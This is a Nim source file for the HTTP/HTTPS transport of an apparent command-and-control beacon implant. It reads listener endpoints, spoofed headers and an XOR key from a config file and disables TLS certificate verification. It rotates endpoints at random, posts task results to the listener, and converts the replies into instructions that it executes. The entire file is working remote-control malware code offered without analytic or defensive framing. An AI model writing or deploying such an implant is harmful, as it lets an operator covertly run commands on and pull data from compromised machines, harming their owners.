import std/net
import httpclient
import json
import uri
import std/strutils
import std/base64
import std/tables
import std/random

import Beacon


const
  xorKeyField* = "xorKey"
  listenerHttpsConfigField* = "ListenerHttpsConfig"
  listenerHttpConfigField* = "ListenerHttpConfig"
  uriField* = "uri"
  clientField* = "client"
  headersField* = "headers"
  headerContentType* = "Content-Type"
  defaultContentTypeValue* = "text/plain;charset=UTF-8"
  httpsScheme* = "https"
  httpScheme* = "http"
  schemeSeparator* = "://"
  portSeparator* = ":"
  pathSeparator* = "/"
  defaultConfigPath* = "BeaconConfig.json"
  exceptionPrefix* = "Inside checkIn, got exception "
  exceptionSuffix* = " with message "


type
  BeaconHttp* = ref object of Beacon
    host: string
    port: string
    scheme: string
    endpoints: seq[string]
    headers: Table[string, string]
    isHttps: bool
    configPath: string


proc loadConfig(self: BeaconHttp, path: string) =
  var configJson: JsonNode
  try:
    configJson = parseFile(path)
  except CatchableError:
    return

  if configJson.hasKey(xorKeyField):
    self.xorKey = configJson[xorKeyField].getStr()

  let listenerKey = if self.isHttps: listenerHttpsConfigField else: listenerHttpConfigField
  if not configJson.hasKey(listenerKey):
    return

  let listenerConfig = configJson[listenerKey]

  if listenerConfig.hasKey(uriField):
    let uriNode = listenerConfig[uriField]
    if uriNode.kind == JArray:
      self.endpoints.setLen(0)
      for value in uriNode:
        if value.kind == JString:
          self.endpoints.add(value.getStr())

  if listenerConfig.hasKey(clientField):
    let clientNode = listenerConfig[clientField]
    if clientNode.kind == JObject and clientNode.hasKey(headersField):
      let headerNode = clientNode[headersField]
      if headerNode.kind == JObject:
        for k, v in headerNode.pairs:
          if v.kind == JString:
            self.headers[k] = v.getStr()


proc initBeaconHttp*(self: BeaconHttp, baseUrl, port: string, configPath = defaultConfigPath) =
  self.initBeacon()
  self.port = port
  self.configPath = configPath

  let parsed = parseUri(baseUrl)
  var scheme = parsed.scheme
  if scheme.len == 0:
    scheme = httpScheme
  self.scheme = scheme.toLowerAscii()
  self.isHttps = self.scheme == httpsScheme
  self.host = parsed.hostname
  if self.host.len == 0:
    self.host = baseUrl

  self.endpoints = @[]
  self.headers = initTable[string, string]()

  self.loadConfig(configPath)

  if self.endpoints.len == 0:
    self.endpoints = @[parsed.path]
  if self.endpoints.len == 0:
    self.endpoints = @[pathSeparator]


proc checkIn*(self: BeaconHttp) =
  let client = newHttpClient(sslContext = newContext(verifyMode = CVerifyNone))

  try:
    var clientHeaders = newHttpHeaders()
    var hasHeaders = false
    for k, v in self.headers.pairs:
      clientHeaders[k] = v
      hasHeaders = true
    if not self.headers.hasKey(headerContentType):
      clientHeaders[headerContentType] = defaultContentTypeValue
      hasHeaders = true
    if hasHeaders:
      client.headers = clientHeaders

    let payload = self.taskResultsToCmd()

    var endpoint = self.endpoints[rand(self.endpoints.high)]
    if endpoint.len == 0:
      endpoint = pathSeparator
    elif endpoint[0] != pathSeparator[0]:
      endpoint = pathSeparator & endpoint

    let fullUrl = self.scheme & schemeSeparator & self.host & portSeparator & self.port & endpoint

    let response = client.request(fullUrl, httpMethod = HttpPost, body = payload)

    if response.code == Http200 and response.body.len > 0:
      self.cmdToTasks(response.body)

  except:
    let
      e = getCurrentException()
      msg = getCurrentExceptionMsg()
    echo exceptionPrefix, repr(e), exceptionSuffix, msg

  finally:
    close(client)


proc runTasks*(self: BeaconHttp) =
    self.execInstruction()
